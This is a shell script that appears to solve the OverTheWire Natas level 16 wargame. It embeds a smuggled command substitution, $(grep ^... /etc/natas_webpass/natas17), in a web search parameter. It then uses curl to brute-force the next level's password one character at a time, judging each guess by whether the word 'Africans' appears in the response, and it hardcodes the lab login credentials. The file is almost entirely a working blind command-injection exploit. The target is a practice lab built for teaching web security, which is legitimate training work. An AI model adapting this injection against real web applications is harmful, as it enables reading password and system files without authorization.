#! /bin/sh

CHARACHTERS="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
PASSWORD=""
for ((i=0 ; i < 32 ; i++)); do
    for ((j=0; j<${#CHARACHTERS}; j++)); do
        CHAR="${CHARACHTERS:${j}:1}"
        printf "${CHAR}"
        NEEDLE="\$(grep ^${PASSWORD}${CHAR} /etc/natas_webpass/natas17)"
        RESPONSE=$(curl -G "http://natas16.natas.labs.overthewire.org" \
                        --silent \
                        --user natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh \
                        --data-urlencode "needle=${NEEDLE}" \
                        --data-urlencode "submit=Search")
        if [[ ${RESPONSE} != *"Africans"* ]]; then
            PASSWORD=${PASSWORD}${CHAR}
            printf "\nFound charachter(s): ${PASSWORD}\n"
            break
        fi
    done
done
printf "The Password for natas17 is: ${PASSWORD}\n"
